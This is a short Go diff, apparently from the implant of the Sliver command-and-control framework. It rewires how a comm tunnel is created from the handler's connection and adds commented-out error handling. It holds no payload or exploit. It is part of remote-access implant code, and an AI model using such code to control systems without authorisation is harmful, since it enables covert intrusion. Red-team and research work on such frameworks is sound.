@@ -188,11 +188,28 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	// {{end}}
 
 	// Create and start a Tunnel. It is already wired up to its transports.Connection, thus working.
-	tunnel := comm.NewTunnel(data.TunnelID, Transports.Active.Connection.RequestSend)
+	tunnel := comm.NewTunnel(data.TunnelID, connection.RequestSend)
 
 	// Comm setup. This is goes on in the background, because we need
 	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
+	// commSystem, err := comm.InitClient(tunnel)
+	// if err != nil {
+	//         // {{if .Config.Debug}}
+	//         log.Printf("Comm Init failed: %s", err)
+	//         // {{end}}
+	//
+	//         muxResp, _ := proto.Marshal(&commpb.TunnelOpen{
+	//                 Success:  false,
+	//                 Response: &commonpb.Response{Err: err.Error()},
+	//         })
+	//         connection.RequestSend(&sliverpb.Envelope{
+	//                 ID:   envelope.ID,
+	//                 Data: muxResp,
+	//         })
+	//         return
+	// }
 	go comm.InitClient(tunnel)
+	// Transports.Active.Comm = commSystem
 
 	muxResp, _ := proto.Marshal(&commpb.TunnelOpen{
 		Success:  true,
@@ -223,7 +240,7 @@ func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.C
 			// {{if .Config.Debug}}
 			log.Printf("[tunnel] No tunnel found for ID %d (Seq: %d)", data.TunnelID, data.Sequence)
 			// {{end}}
-			time.Sleep(100 * time.Millisecond)
+			time.Sleep(100 * time.Millisecond) // TODO: check why
 			continue
 		}
 	}
